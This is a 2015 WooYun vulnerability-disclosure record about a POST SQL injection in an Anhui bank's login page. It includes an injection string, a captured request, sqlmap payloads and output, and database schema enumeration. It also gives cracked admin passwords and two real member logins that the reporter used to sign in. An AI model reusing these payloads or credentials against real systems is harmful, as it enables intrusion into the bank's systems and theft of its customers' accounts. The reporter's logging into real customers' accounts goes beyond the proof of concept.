{"id": 67112, "wybug_id": "wooyun-2015-0142939", "wybug_title": "安徽某银行系统官网主站存在POST型SQL注入导致敏感数据泄露（已登录部分会员账户）", "wybug_corp": "安徽某银行", "wybug_author": "路人甲", "wybug_date": "2015-09-24 12:16", "wybug_open_date": "2015-11-13 09:14", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["字符类型注射"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-09-24：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-09-29：\tcncert国家互联网应急中心暂未能联系到相关单位，细节仅向通报机构公开\t\t\t\t\t\t\t\t\t2015-10-09：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-10-19：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-10-29：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-11-13：\t细节向公众公开  简要描述： RT 详细说明：  宿州农商行主站（http://**.**.**.**/）用户登录中的“用户名”参数存在POST型SQL注入，可导致银行系统数据被拖库。（已经获取部分会员账号并且成功登录),后台管理员用户名密码也已经破解,但是后台目前无法访问...   漏洞证明：  宿州农商行主站（http://**.**.**.**/）用户登录中的“用户名”参数存在POST型SQL注入，可导致银行系统数据被拖库。一开始，手工先试了下，当用户名输入：admin’ or ‘1’=’1’，密码随便输入，例如123456\n\n点击登录，系统SQL报错，初步断定存在SQL注入。\n\n于是登录抓包：\nPOST /index.php/member-ac-chklogin.html HTTP/1.1Host: **.**.**.**Proxy-Connection: keep-aliveContent-Length: 76Cache-Control: max-age=0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Origin: http://**.**.**.**User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.132 Safari/537.36Content-Type: application/x-www-form-urlencodedReferer: http://**.**.**.**/Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.8,en;q=0.6Cookie: PHPSESSID=hkc1dcq2g5l0s65b6ci6b0kgm0; CNZZDATA3459593=cnzz_eid%3D609140000-1442970237-%26ntime%3D1442970237username=11111&password=22222&ctl00%24rb=PBB_usercentern&ctl00%24btn_login=+\n工具测试下：数据库MySQL5.0，OS为Windows\nsqlmap identified the following injection points with a total of 99 HTTP(s) requests:---Place: POSTParameter: username    Type: error-based    Title: MySQL >= 5.0 AND error-based - WHERE or HAVING clause    Payload: username=11111' AND (SELECT 2361 FROM(SELECT COUNT(*),CONCAT(0x716d6b7171,(SELECT (CASE WHEN (2361=2361) THEN 1 ELSE 0 END)),0x71636b6371,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND 'bjtl'='bjtl&password=22222&ctl00$rb=PBB_usercentern&ctl00$btn_login= ---web server operating system: Windowsweb application technology: ASP.NET, PHP 5.2.17back-end DBMS: MySQL 5.0\n一共包含2个数据库：\nPlace: POSTParameter: username    Type: error-based    Title: MySQL >= 5.0 AND error-based - WHERE or HAVING clause    Payload: username=11111' AND (SELECT 2361 FROM(SELECT COUNT(*),CONCAT(0x716d6b7171,(SELECT (CASE WHEN (2361=2361) THEN 1 ELSE 0 END)),0x71636b6371,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND 'bjtl'='bjtl&password=22222&ctl00$rb=PBB_usercentern&ctl00$btn_login= ---web server operating system: Windowsweb application technology: ASP.NET, PHP 5.2.17back-end DBMS: MySQL 5.0available databases [2]:[*] information_schema[*] sznsh\n当前数据库为：\nweb server operating system: Windowsweb application technology: ASP.NET, PHP 5.2.17back-end DBMS: MySQL 5.0current database:    'sznsh'sqlmap identified the following injection points with a total of 0 HTTP(s) requests:---\nsznsh数据库包含17表：\nweb server operating system: Windowsweb application technology: ASP.NET, PHP 5.2.17back-end DBMS: MySQL 5.0Database: sznsh[17 tables]+-----------------+| gdb_admin       || gdb_advert      || gdb_article     || gdb_candidates  || gdb_careers     || gdb_category    || gdb_columns     || gdb_config      || gdb_download    || gdb_links       || gdb_linkscate   || gdb_members     || gdb_message     || gdb_reservation || gdb_single      || gdb_video       || gdb_works       |+-----------------+\n看一下gda_admin管理员表结构：\nweb server operating system: Windowsweb application technology: ASP.NET, PHP 5.2.17back-end DBMS: MySQL 5.0Database: sznshTable: gdb_admin[12 columns]+-----------------+-------------+| Column          | Type        |+-----------------+-------------+| addtime         | int(11)     || email           | varchar(50) || flag            | tinyint(1)  || id              | int(10)     || last_login_ip   | varchar(20) || last_login_time | int(11)     || login_ip        | varchar(20) || login_time      | int(11)     || password        | varchar(50) || sid             | varchar(50) || uname           | varchar(20) || userid          | varchar(20) |+-----------------+-------------+\ndump下管理员表：\n\n这两个MD5值都可以在网上破解。（破解后密码一个是admin123，另一个是govland&2007），但是目前系统后台暂时不能访问...gdb_members表包含了银行会员信息，那就来看下：\nDatabase: sznshTable: gdb_members[12 columns]+-----------+--------------+| Column    | Type         |+-----------+--------------+| address   | varchar(100) || email     | varchar(50)  || id        | int(11)      || is_passed | tinyint(1)   || name      | varchar(50)  || password  | varchar(50)  || qq        | varchar(15)  || regtime   | int(10)      || sex       | varchar(5)   || tel       | varchar(50)  || username  | varchar(50)  || zipcode   | varchar(10)  |+-----------+--------------+\n一共包含273个会员，我就跑了几个会员信息\n\n会员用户名、密码、邮箱、电话等信息一览无余...\n\n于是拿了一个密码202cb962ac59075b964b07152d234b70破解了下，擦密码是123以如下两个会员账号在前台登录yuxiangshui/123zl20118/123先用yuxiangshui/123账号登录：可以管理会员信息、修改密码，查看留言等\n\n\n\n在登录下zl20118/123账号看看\n\nOK，就说到这里..   修复方案：  你们是专家。   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：10  确认时间：2015-09-29 09:13 厂商回复：     CNVD确认并复现所述漏洞情况，已经转由CNCERT下发给安徽分中心，由安徽分中心后续协调网站管理单位处置。  最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 10, "Ranks": null}